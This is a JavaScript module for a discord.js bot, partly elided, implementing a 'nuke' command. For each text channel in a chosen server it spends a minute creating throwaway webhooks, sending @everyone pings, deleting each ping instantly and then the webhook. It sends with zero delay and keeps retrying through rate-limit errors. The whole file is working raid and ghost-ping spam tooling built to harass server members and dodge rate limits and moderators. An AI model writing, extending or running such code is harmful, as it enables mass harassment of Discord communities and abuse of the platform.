const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType } = require('discord.js');

module.exports = (client) => {
  const ADMIN_SERVER_ID  = '1455924604085473361';
  const ADMIN_CHANNEL_ID = '1455928469434138708';
  const PREFIX = '?';

  // ... (messageCreate handler remains unchanged - same as before)

  client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton() && interaction.customId === 'nukeButton') {
      // ... (modal show code unchanged)
    }

    if (interaction.type !== InteractionType.ModalSubmit) return;
    if (interaction.customId !== 'nukeModal') return;

    await interaction.deferReply({ ephemeral: true });

    const serverId  = interaction.fields.getTextInputValue('serverIdInput').trim();
    const channelId = interaction.fields.getTextInputValue('channelIdInput').trim();

    try {
      const targetGuild = await client.guilds.fetch(serverId);
      if (!targetGuild) return await interaction.editReply('Server not found.');

      let targetChannels = [];

      if (channelId) {
        let targetChannel;
        try { targetChannel = await targetGuild.channels.fetch(channelId); } catch {}
        if (!targetChannel || !targetChannel.isTextBased()) {
          return await interaction.editReply('Invalid channel.');
        }
        targetChannels = [targetChannel];
      } else {
        targetChannels = targetGuild.channels.cache.filter(c =>
          c.isTextBased() &&
          c.permissionsFor(targetGuild.members.me)?.has(['SendMessages', 'ManageWebhooks'])
        );
        targetChannels = [...targetChannels.values()];
      }

      if (targetChannels.length === 0) {
        return await interaction.editReply('No valid channels (need SendMessages + ManageWebhooks).');
      }

      let totalSent = 0;
      const BURST_DURATION_MS = 60000; // 1 min per channel
      const MIN_DELAY_MS = 0;          // zero delay for max speed — will 429 fast

      for (const channel of targetChannels) {
        const startTime = Date.now();
        let webhookCounter = 1;

        while (Date.now() - startTime < BURST_DURATION_MS) {
          try {
            // Unique webhook name each time
            const webhookName = `Alert #${webhookCounter++}`;
            // Optional: random avatar (add real URLs or leave null)
            // const avatars = ['https://example.com/avatar1.png', 'https://example.com/avatar2.png'];
            // const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)] || null;

            const webhook = await channel.createWebhook({
              name: webhookName,
              avatar: null, // randomAvatar if you add some
              reason: 'Alert'
            });

            const sentMsg = await webhook.send({
              content: '@everyone',
              allowedMentions: { parse: ['everyone'] }
            });

            totalSent++;

            // Delete ping instantly
            if (sentMsg?.id) {
              await sentMsg.delete().catch(() => {});
            }

            // Delete webhook
            await webhook.delete('Cleanup').catch(() => {});

            // No delay → pure speed
            // await new Promise(r => setTimeout(r, MIN_DELAY_MS)); // uncomment if needed

          } catch (err) {
            console.log(`[${channel.id}] Error: ${err.message || err}`);
            if (err.code === 429) {
              // Rate limit hit → short backoff then retry aggressively
              await new Promise(r => setTimeout(r, 1000)); // 1 sec backoff
            } else if (err.code === 50027 || err.code === 10003) {
              // Invalid webhook or channel gone → skip to next cycle
              await new Promise(r => setTimeout(r, 500));
            }
            // Keep hammering
          }
        }
      }

      await interaction.editReply(`Max-speed burst done! Sent **${totalSent}** @everyone pings (instant delete via temp webhooks). ~1 min/channel.`);
    } catch (error) {
      console.error('Nuke failed:', error);
      await interaction.editReply('Command errored out.');
    }
  });
};